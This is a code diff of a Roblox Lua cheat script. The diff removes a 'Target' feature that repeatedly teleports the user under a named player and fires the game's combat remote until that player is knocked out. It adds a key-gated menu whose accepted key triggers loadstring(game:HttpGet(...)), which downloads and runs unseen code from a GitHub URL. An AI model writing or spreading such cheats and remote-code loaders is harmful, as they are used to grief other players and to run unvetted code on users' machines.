@@ -2,8 +2,8 @@ local screenGui = Instance.new("ScreenGui")
 screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 
 local mainFrame = Instance.new("Frame")
-mainFrame.Size = UDim2.new(0, 250, 0, 150)
-mainFrame.Position = UDim2.new(0, 10, 0, 10)
+mainFrame.Size = UDim2.new(0, 300, 0, 200)
+mainFrame.Position = UDim2.new(0.5, -150, 0.5, -100)
 mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
 mainFrame.BackgroundTransparency = 0.3
 mainFrame.BorderSizePixel = 2
@@ -15,7 +15,7 @@ titleLabel.Size = UDim2.new(1, 0, 0, 40)
 titleLabel.Position = UDim2.new(0, 0, 0, 0)
 titleLabel.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
 titleLabel.BorderSizePixel = 0
-titleLabel.Text = "Syntax"
+titleLabel.Text = "Syntax Key System"
 titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 titleLabel.TextSize = 28
 titleLabel.Font = Enum.Font.SourceSansBold
@@ -28,94 +28,68 @@ uiGradient.Color = ColorSequence.new{
 }
 uiGradient.Parent = titleLabel
 
-local usernameTextBox = Instance.new("TextBox")
-usernameTextBox.Size = UDim2.new(1, -20, 0, 30)
-usernameTextBox.Position = UDim2.new(0, 10, 0, 50)
-usernameTextBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-usernameTextBox.BorderSizePixel = 0
-usernameTextBox.Text = "Enter Username"
-usernameTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-usernameTextBox.TextSize = 20
-usernameTextBox.Font = Enum.Font.SourceSans
-usernameTextBox.Parent = mainFrame
+local keyTextBox = Instance.new("TextBox")
+keyTextBox.Size = UDim2.new(1, -20, 0, 30)
+keyTextBox.Position = UDim2.new(0, 10, 0, 60)
+keyTextBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+keyTextBox.BorderSizePixel = 0
+keyTextBox.Text = "Enter Key"
+keyTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+keyTextBox.TextSize = 20
+keyTextBox.Font = Enum.Font.SourceSans
+keyTextBox.Parent = mainFrame
 
-local targetButton = Instance.new("TextButton")
-targetButton.Size = UDim2.new(1, -20, 0, 40)
-targetButton.Position = UDim2.new(0, 10, 0, 90)
-targetButton.BackgroundColor3 = Color3.fromRGB(0, 128, 255)
-targetButton.BorderSizePixel = 0
-targetButton.Text = "Target"
-targetButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-targetButton.TextSize = 22
-targetButton.Font = Enum.Font.SourceSansBold
-targetButton.Parent = mainFrame
+local submitButton = Instance.new("TextButton")
+submitButton.Size = UDim2.new(1, -20, 0, 40)
+submitButton.Position = UDim2.new(0, 10, 0, 100)
+submitButton.BackgroundColor3 = Color3.fromRGB(0, 128, 255)
+submitButton.BorderSizePixel = 0
+submitButton.Text = "Submit"
+submitButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+submitButton.TextSize = 22
+submitButton.Font = Enum.Font.SourceSansBold
+submitButton.Parent = mainFrame
 
 local uiGradientButton = Instance.new("UIGradient")
 uiGradientButton.Color = ColorSequence.new{
     ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 128, 255)),
     ColorSequenceKeypoint.new(1, Color3.fromRGB(30, 30, 30))
 }
-uiGradientButton.Parent = targetButton
+uiGradientButton.Parent = submitButton
 
-local holding = false
-local following = false
-local targetPlayer = nil
+-- Key System
+local validKeys = { "syntax" }
 
-local function followAndCharge()
-    local username = usernameTextBox.Text
-    targetPlayer = game.Players:FindFirstChild(username)
-    local localPlayer = game.Players.LocalPlayer
-    local character = localPlayer.Character
-    local backpack = localPlayer.Backpack
+local function checkKey(key)
+    print("Checking key:", key)  -- Debug print to see what key is being checked
+    for _, v in pairs(validKeys) do
+        if key == v then
+            print("Key is valid")  -- Debug print if the key is valid
+            return true
+        end
+    end
+    print("Key is invalid")  -- Debug print if the key is invalid
+    return false
+end
+
+local function executeMainScript()
+    print("Executing main script...")  -- Debug print before script execution
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/sectve/ok/main/ok'))()
+    print("Script executed.")  -- Debug print after script execution
+end
+
+local function onSubmit()
+    local enteredKey = keyTextBox.Text
+    print("Entered Key:", enteredKey)  -- Debug print to show the entered key
     
-    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
-        local combatTool = backpack:FindFirstChild("Combat")
-        if combatTool then
-            combatTool.Parent = character
-            character:FindFirstChildOfClass("Humanoid"):EquipTool(combatTool)
-        else
-            print("Combat tool not found in Backpack")
-            return
-        end
-        
-        holding = true
-        following = true
-        
-        while holding do
-            if targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") and
-                localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
-                
-                local targetPosition = targetPlayer.Character.HumanoidRootPart.Position
-                localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(targetPosition + Vector3.new(0, -5, 0))
-                
-                local args = {
-                    [1] = "ChargeButton"
-                }
-                game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
-
-                local humanoid = targetPlayer.Character:FindFirstChild("Humanoid")
-                local bodyEffects = targetPlayer.Character:FindFirstChild("BodyEffects")
-                local movement = bodyEffects and bodyEffects:FindFirstChild("Movement")
-                if humanoid and humanoid.Health <= 0 then
-                    localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(targetPosition + Vector3.new(0, 5, 0))
-                    following = false
-                    break
-                elseif movement and movement:FindFirstChild("K.O") then
-                    following = false
-                    break
-                end
-            end
-            wait(0.01)
-        end
+    if checkKey(enteredKey) then
+        keyTextBox.Text = "Authorised!"
+        wait(1)
+        executeMainScript()
+        screenGui:Destroy()  -- Close the GUI after authorization
     else
-        print("Player not found or invalid target")
+        keyTextBox.Text = "Wrong Key!"
     end
 end
 
-local function stopFollowing()
-    holding = false
-    following = false
-end
-
-targetButton.MouseButton1Down:Connect(followAndCharge)
-targetButton.MouseButton1Up:Connect(stopFollowing)
+submitButton.MouseButton1Click:Connect(onSubmit)
